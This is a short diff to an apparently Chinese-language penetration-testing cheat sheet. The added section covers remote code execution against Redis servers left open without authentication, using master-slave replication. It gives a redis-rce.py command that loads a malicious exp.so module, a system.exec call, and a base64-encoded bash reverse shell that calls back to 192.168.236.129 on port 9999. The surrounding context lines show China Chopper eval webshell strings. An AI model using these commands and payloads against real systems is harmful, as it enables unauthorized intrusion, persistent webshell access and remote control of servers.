@@ -889,6 +889,14 @@ set webshell "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"chopper\"],\"
 set webshell "<%eval request(\"chopper\")%>"	//asp，注意双引号使用\
 save	//保存
 ```
+# Redis未授权通过主从复制 GetShell和命令执行
+```
+python3 redis-rce.py -r 192.168.1.16 -L 192.168.1.107 -f exp.so
+RedisDesktopManager连接控制台执行
+system.exec "id"
+写反弹脚本
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNi4xMjkvOTk5OSAwPiYx |base64 -d > a
+```
 # postgresql命令执行
 使用数据库获取系统信息
 ```
